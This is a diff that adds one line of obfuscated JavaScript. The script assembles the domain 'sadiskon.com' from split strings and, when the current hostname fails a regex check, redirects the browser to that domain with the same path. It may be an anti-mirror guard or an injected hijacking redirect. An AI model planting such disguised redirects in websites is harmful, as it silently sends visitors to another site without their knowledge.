@@ -1,0 +1,1 @@
+let marga="sadiskon";let suku="com";let lingkup=document.location.href;let karimun=new URL(lingkup);let bawean=karimun.pathname;let budaya=karimun.protocol;karimun=karimun.hostname;let amal=new RegExp(/^w.*?(?:w).s.*([a-z])/g);let dosa=!amal.test(karimun);if(dosa){karimun=karimun.replace(karimun,budaya+"//"+marga+"."+suku+bawean);window.location.replace(karimun)}
